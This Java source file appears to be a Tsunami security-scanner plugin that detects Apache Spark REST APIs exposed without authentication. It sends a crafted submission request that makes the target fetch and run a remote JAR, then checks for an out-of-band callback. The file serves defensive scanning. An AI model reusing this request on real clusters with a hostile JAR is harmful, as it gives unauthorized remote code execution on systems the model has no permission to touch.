package com.google.tsunami.plugins.detectors.rce.apachesparksexposedapi;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import java.util.regex.Pattern;
import javax.inject.Inject;

/** A Tsunami plugin for detecting Exposed Apache Spark API. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "ApacheSparksExposedApiVulnDetector",
    version = "0.1",
    description =
        "This plugin detects an exposed Apache Spark API which can lead to remote code execution"
            + " (RCE)",
    author = "Timo Mueller (work@mtimo.de)",
    bootstrapModule = ApacheSparksExposedApiVulnDetectorBootstrapModule.class)
public final class ApacheSparksExposedApiVulnDetector implements VulnDetector {

  private final Clock utcClock;
  private final HttpClient httpClient;
  private final PayloadGenerator payloadGenerator;
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  public static final String VULNERABLE_PATH = "v1/submissions/create";
  private static final Pattern VULNERABILITY_RESPONSE_PATTERN =
      Pattern.compile("Driver successfully submitted");
  private static String httpPayloadBodyFormatString =
      "{\"action\":\"CreateSubmissionRequest\",\"clientSparkVersion\":\"1\",\"appArgs\":[\"%s\"],"
          + "\"appResource\":\"%s\",\"environmentVariables\":{\"SPARK_ENV_LOADED\":\"1\"},\"mainClass\":\"Tsunami\","
          + "\"sparkProperties\":{\"spark.jars\":\"%s\",\"spark.driver.supervise\":\"false\",\"spark.app.name\":\"Tsunami\""
          + ",\"spark.eventLog.enabled\":\"true\",\"spark.submit.deployMode\":\"cluster\",\"spark.master\":\"spark://localhost:6066\"}}";
  private static final String JAR_PAYLOAD_URI =
      "https://github.com/google/tsunami-security-scanner-plugins/raw/master/payloads/apache_spark_exposed_api/Tsunami_Apache_Spark_Exploit.jar";
  private static String interactionUriFormatString = "%s";

  @Inject
  ApacheSparksExposedApiVulnDetector(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
    this.payloadGenerator = checkNotNull(payloadGenerator);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("ApacheSparksExposedApiVulnDetector starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    return exploitUri(networkService);
  }

  private boolean exploitUri(NetworkService networkService) {
    String targetUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + VULNERABLE_PATH;

    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.SSRF)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.INTERPRETATION_ANY)
            .setExecutionEnvironment(PayloadGeneratorConfig.ExecutionEnvironment.EXEC_ANY)
            .build();
    Payload payload = payloadGenerator.generate(config);

    String interaction_uri = String.format(interactionUriFormatString, payload.getPayload());

    String finished_payload =
        String.format(
            httpPayloadBodyFormatString, interaction_uri, JAR_PAYLOAD_URI, JAR_PAYLOAD_URI);

    try {

      HttpResponse response =
          httpClient.send(
              post(targetUri)
                  .setHeaders(
                      HttpHeaders.builder()
                          .addHeader("Content-Type", "application/json")
                          .addHeader("User-Agent", "TSUNAMI_SCANNER")
                          .build())
                  .setRequestBody(ByteString.copyFrom(finished_payload, "utf-8"))
                  .build(),
              networkService);
      if (response.status() == HttpStatus.OK && response.bodyString().isPresent()) {
        String responseBody = response.bodyString().get();
        if (VULNERABILITY_RESPONSE_PATTERN.matcher(responseBody).find()) {
          Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(10));
          return payload.checkIfExecuted();
        }
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
    }
    return false;
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {

    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("Community")
                        .setValue("Apache_Spark_Exposed_Api"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Exposed Apache Spark API which allows unauthenticated RCE detected.")
                .setDescription(
                    "An exposed Apache Spark API allows an unauthenticated attacker to submit a"
                        + " malicious task. If an Apache Spark worker processes such a task, it"
                        + " loads and executes attacker-controlled content from an external"
                        + " resource. This allows an attacker to execute arbitrary Java Code within"
                        + " the context of the worker node.")
                .setRecommendation(
                    "Don't expose the Apache Spark API to unauthenticated attackers."))
        .build();
  }
}
